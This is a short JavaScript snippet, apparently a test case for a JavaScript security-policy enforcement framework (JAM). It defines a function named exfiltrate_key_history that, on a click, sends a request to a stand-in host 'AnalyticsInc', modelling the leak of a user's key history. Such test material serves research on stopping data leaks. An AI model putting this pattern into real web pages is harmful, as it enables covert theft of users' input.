
JAM.startProfile('load');
function exfiltrate_key_history(){xmlhttp=new XMLHttpRequest;JAM.call(xmlhttp.open,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=baseline",!0],JAM.policy.p13);JAM.call(xmlhttp.send,xmlhttp,[null],JAM.policy.p14)}JAM.set(JAM.call(document.getElementById,document,["test"],JAM.policy.p13),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
